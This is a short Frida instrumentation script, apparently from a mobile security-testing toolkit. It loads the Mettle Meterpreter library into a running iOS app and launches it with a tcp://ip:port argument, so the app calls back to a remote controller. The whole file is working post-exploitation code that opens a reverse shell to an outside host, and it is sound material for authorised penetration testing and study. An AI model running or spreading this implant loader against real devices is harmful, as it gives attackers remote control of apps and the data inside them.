rpc.exports = {
  initMettle: function (dlib) {
    const NSDocumentDirectory = 9;
    const NSUserDomainMask = 1
    const p = ObjC.classes.NSFileManager.defaultManager()
      .URLsForDirectory_inDomains_(NSDocumentDirectory, NSUserDomainMask).lastObject().path();

    ObjC.schedule(ObjC.mainQueue, function () {
      Module.load(p + '/' + dlib);
    });
  },
  connectMettle: function(dlib, ip, port) {
    var source = "#include <glib.h>" +
    "char **getargs() {" +
    "    char **argv = g_malloc(3 * sizeof(char*));" +
    "    argv[0] = \"mettle\";" +
    "    argv[1] = \"-u\";" +
    "    argv[2] = \"tcp://{ip}:{port}\";" +
    "    return argv;" +
    "}";

    // update with the target ip:port
    source = source.replace("{ip}", ip);
    source = source.replace("{port}", port);

    const cm = new CModule(source);
    const argv = new NativeFunction(cm.getargs, 'pointer', []);

    const mettle = Process.getModuleByName(dlib);
    const mettleMainPtr = mettle.findExportByName('main');
    console.log('Found mettle::main @ ' + mettleMainPtr);
    const mettleMain = new NativeFunction(mettleMainPtr, 'void', ['int', 'pointer']);

    // don't block the ui
    ObjC.schedule(ObjC.mainQueue, function () {
      console.log('Calling mettleMain()');
      mettleMain(3, argv());
    });
  }
}
